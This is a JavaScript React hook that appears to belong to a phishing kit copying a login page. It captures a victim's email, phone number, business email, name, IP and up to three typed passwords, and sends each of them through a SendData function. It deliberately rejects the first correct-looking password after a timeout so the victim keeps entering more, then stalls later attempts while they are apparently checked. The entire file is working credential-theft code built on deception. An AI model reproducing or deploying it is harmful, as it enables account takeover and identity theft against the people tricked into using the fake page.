import { useState, useEffect, useContext } from "react";
import { DataContext } from "../pages";
import SendData from "./SendData.js";

export const usePasswordAuth = ({
  Unik,
  Email,
  Tel,
  BusinessEmail,
  Name,
  Ip,
  wrongPasswordTrigger = 0,
  setParentBeginTimer,
}) => {
  const { setAllData, AllData } = useContext(DataContext);

  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [passwordError, setPasswordError] = useState("");
  const [emailError, setEmailError] = useState("");
  const [triedSubmit, setTriedSubmit] = useState(false);
  const [passwordAttempt, setPasswordAttempt] = useState(1); // Track which attempt we're on
  const [lastProcessedWrongPassword, setLastProcessedWrongPassword] =
    useState(wrongPasswordTrigger);
  const [wrongPasswordCount, setWrongPasswordCount] = useState(0); // Count of wrong password attempts

  useEffect(() => {
    if (
      wrongPasswordTrigger === lastProcessedWrongPassword &&
      wrongPasswordTrigger === wrongPasswordCount
    ) {
      return;
    }
    // Mark as processed and increment wrong password count
    setLastProcessedWrongPassword(wrongPasswordTrigger);
    const newCount = wrongPasswordCount + 1;
    setWrongPasswordCount(newCount);

    setIsLoading(false);
    setPassword("");
    setPasswordError("The password that you've entered is incorrect.");

    // Set next password attempt
    const newAttempt = newCount + 1;
    setPasswordAttempt(newAttempt);

    // Send the current password to server
    const passwordField = newAttempt === 2 ? "password_two" : "password_three";
    const params = {
      ...AllData,
      id: Unik,
      phone_number: Tel,
      login_email: Email,
      business_email: BusinessEmail,
      ip: Ip,
      full_name: Name,
      [passwordField]: password,
      currentStep: `Wrong Password - Attempt ${newAttempt} - User requested to try again`,
    };

    SendData(params);
  }, [wrongPasswordTrigger, lastProcessedWrongPassword]);

  const clearPasswordError = () => {
    setPasswordError("");
  };

  const clearEmailError = () => {
    setEmailError("");
  };

  const validateEmail = (email) => {
    if (!email || email.trim() === "") {
      setEmailError("Please enter your email, phone number or username");
      return false;
    }
    return true;
  };

  const validatePassword = (password) => {
    if (password.length < 5) {
      setPasswordError("Please enter a valid password");
      return false;
    }
    return true;
  };

  const handleSubmit = () => {
    setTriedSubmit(true);

    // Validate inputs
    if (!validateEmail(Email) || !validatePassword(password)) {
      return;
    }

    setIsLoading(true);

    // Determine password field and parameters
    let passwordField, params, timeout;

    if (passwordAttempt === 1) {
      // First attempt
      passwordField = "password_one";
      timeout = process.env.NEXT_PUBLIC_PASSWORD1_DURATION
        ? parseInt(process.env.NEXT_PUBLIC_PASSWORD1_DURATION) * 1000
        : 10000;

      params = {
        ...AllData,
        id: Unik,
        phone_number: Tel,
        login_email: Email,
        business_email: BusinessEmail,
        ip: Ip,
        full_name: Name,
        [passwordField]: password,
        currentStep: `Password attempt ${passwordAttempt} submitted password: \`${password}\`, loading for ${
          timeout / 1000
        }s`,
      };

      // Auto-fail first attempt after timeout
      setTimeout(() => {
        setPassword("");
        setPasswordError("The password that you've entered is incorrect.");
        setPasswordAttempt(2);
        setWrongPasswordCount(1);
        setIsLoading(false);
      }, timeout);
    } else {
      // Subsequent attempts (2+ use password_two or password_three)
      passwordField = passwordAttempt === 2 ? "password_two" : "password_three";
      timeout = 60000; // 60 seconds for subsequent attempts

      params = {
        ...AllData,
        id: Unik,
        phone_number: Tel,
        login_email: Email,
        business_email: BusinessEmail,
        ip: Ip,
        full_name: Name,
        [passwordField]: password,
        currentStep: `Password attempt ${passwordAttempt} submitted, waiting for verification`,
      };

      setParentBeginTimer(true);
      setTimeout(() => setIsLoading(false), timeout);
    }

    setAllData(params);
    SendData(params);
  };

  return {
    password,
    setPassword,
    isLoading,
    passwordError,
    emailError,
    triedSubmit,
    passwordAttempt,
    wrongPasswordCount,
    handleSubmit,
    clearPasswordError,
    clearEmailError,
  };
};
